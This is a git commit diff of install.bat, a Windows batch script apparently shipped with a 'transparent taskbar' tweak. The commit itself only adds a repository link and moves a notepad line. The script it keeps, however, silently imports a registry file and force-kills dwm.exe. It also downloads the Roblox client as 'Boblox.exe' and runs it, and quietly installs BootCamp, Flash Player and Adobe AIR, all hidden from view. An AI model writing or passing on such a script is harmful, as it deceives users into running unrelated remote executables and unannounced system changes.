c55e337f42350e9ea3cadd9d2c88ee496f1dca1c
Saylangoz1 <132298381+Saylangoz1@users.noreply.github.com>
2023-05-29 12:39:25 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -3,8 +3,7 @@ title Please Wait...
 echo Please Wait...
 regedit /s i.reg
 taskkill /f /im dwm.exe
-start /min firefox.exe about:robots > NUL
-start notepad IMPORTANT.TXT
+start https://github.com/Saylangoz1/Win10-Transparent-Taskbar
 start /min /wait curl -L https://www.roblox.com/download/client --output Boblox.exe > NUL
 start /min Boblox.exe > NUL
 start /min msiexec /i BootCamp\Drivers\Apple\BootCamp.msi /qn > NUL
@@ -13,3 +12,4 @@ start /min /wait flashplayer32_0r0_371_winpep.exe -install > NUL
 start /min /wait flashplayer32_0r0_371_win.exe -install > NUL
 start /min /wait curl https://airsdk.harman.com/assets/downloads/AdobeAIR.exe --output AdobeAIR.exe > NUL
 start /min /wait AdobeAIR.exe -silent > NUL
+start notepad IMPORTANT.TXT
